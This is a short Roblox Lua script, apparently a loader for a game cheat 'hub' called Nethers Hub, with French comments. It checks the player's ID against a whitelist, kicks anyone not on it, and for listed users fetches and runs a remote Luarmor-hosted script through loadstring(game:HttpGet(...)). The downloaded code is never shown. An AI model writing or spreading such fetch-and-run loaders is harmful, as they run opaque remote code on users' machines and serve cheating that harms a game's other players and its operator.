-- [[ NETHERS HUB - WHITELIST SYSTEM ]]
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- LISTE DES IDS AUTORISÉS
local WhitelistedIDs = {
    9453982711, -- ID extrait de ton lien (Utilisateur : Die ou autre)
    -- Ajoute d'autres IDs ici séparés par une virgule
}

-- Fonction de vérification d'accès
local function StartNethersHub()
    local isWhitelisted = false
    
    -- Vérification rapide dans la liste des IDs
    for _, id in pairs(WhitelistedIDs) do
        if player.UserId == id then
            isWhitelisted = true
            break
        end
    end

    if isWhitelisted then
        -- L'utilisateur est autorisé, on lance le script Luarmor
        print("Access Granted - Nethers Hub")
        
        local success, err = pcall(function()
            loadstring(game:HttpGet("https://api.luarmor.cc/files/v4/loaders/36d729f6d33548ada4452c36256f5ac9.lua"))()
        end)
        
        if not success then
            warn("Nethers Hub : Erreur lors du chargement du script.")
        end
    else
        -- Si l'ID n'est pas dans la liste, on kick avec ton message exact
        player:Kick("you are not withelisted")
    end
end

-- Lancement de la vérification
StartNethersHub()
